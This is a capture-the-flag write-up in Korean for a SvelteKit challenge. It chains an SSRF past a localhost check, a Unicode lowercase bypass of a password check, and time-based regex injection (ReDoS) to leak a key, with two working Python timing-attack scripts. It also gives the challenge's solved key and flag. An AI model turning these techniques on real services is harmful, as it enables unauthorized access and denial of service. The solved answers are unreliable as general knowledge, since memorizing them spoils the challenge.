# svelte_api_v2

# Usage

# Concept

- ReDoS, SSRF, unicode normalization bug

# Writeup

`src/routes/api/get-flag/+server.js`에서 특정 조건을 통과하면 플래그를 획득할 수 있다.

```js
if (a === flagPassword && user_key2 === key2) {
  return json({
    text: flag,
  });
}
```

첫번째로 `src/routes/api/get-flag/+server.js`에서는 localhost 이외의 접속을 차단하고 있다.

```js
if (!["localhost", "127.0.0.1", "", "::1"].includes(ip)) {
  return json({
    text: "only localhost allowed",
    ip: ip,
  });
}
```

이것을 우회하기 위해서 `src/routes/+page.server.js`에서의 ssrf 취약점을 이용하여 접근할 수 있다.

```js
export const actions = {
  default: async (event) => {
    //console.log(event);

    const data = await event.request.formData();
    const url = data.get("url");

    const req = fetch(url);
    const res = await req;
    const text = await res.text();

    event.cookies.set("result", text);

    return { success: true };
  },
};
```

그 다음으로는 flagPassword 확인하는 부분을 unicode normalization을 통해 우회할 수 있다.
toLowerCase 함수를 사용하기 때문에 특정 유니코드를 입력하면 ascii로 치환되는 것을 이용한다.

```js
"hac\u212A".toLowerCase() == "hack";
```

마지막으로 key2를 구하기 위해서는 Time based regex injection을 이용할 수 있다.
search 메서드를 사용하고 있기 때문에 ReDoS가 가능하다.

Time based regex injection의 경우, 정확한 값을 구하기 위해서 forward search, backword search 두 가지를 이용해야 한다.

```js
// forward search
import requests, sys
from time import time

prefix = "OAZQ"
depth = 2

if len(sys.argv) >= 3:
    depth = int(sys.argv[2])
    prefix = sys.argv[1]
elif len(sys.argv) >= 2:
    depth = int(sys.argv[1])

suffix = "(" * depth + "." + "*)" * depth + "!"

r = []
for c in "_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-":
    begin = time()
    req = requests.get(
        "http://localhost:5173/what-is-my-user-agent",
        params={"key2": prefix + c + suffix},
    )
    print(req.text)
    r.append([c, time() - begin])

r = sorted(r, key=lambda x: x[1])

for d in r[::-1][:3]:
    print("[*] {} : {}".format(d[0], d[1]))

// backword search
import requests, sys
from time import time

prefix = ''
depth = 2

if len(sys.argv) >= 3:
    depth = int(sys.argv[2])
    prefix = sys.argv[1]
elif len(sys.argv) >= 2:
    depth = int(sys.argv[1])

prefix2 = '(' * depth
suffix = ')*' * depth

r = []
for c in '_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':
    begin = time()
    requests.get('http://localhost:5173/what-is-my-user-agent', params = {
        'key2': prefix + prefix2 + '[^{}]'.format(c) + suffix + '!'
    })
    r.append([c, time() - begin])

r = sorted(r, key = lambda x: x[1])

for d in r[:5]:
    print('[*] {} : {}'.format(d[0], d[1]))
```

이 방법을 이용하여 구한 키는 다음과 같다.
`HELLOSPACEWARWEB`

앞에서 구한 모든 것을 종합하여 `api/get-flag`에 요청을 보내면 플래그를 획득할 수 있다.

flag: `hspace{1367208a460b08c8b2906c91834b8c8b}`
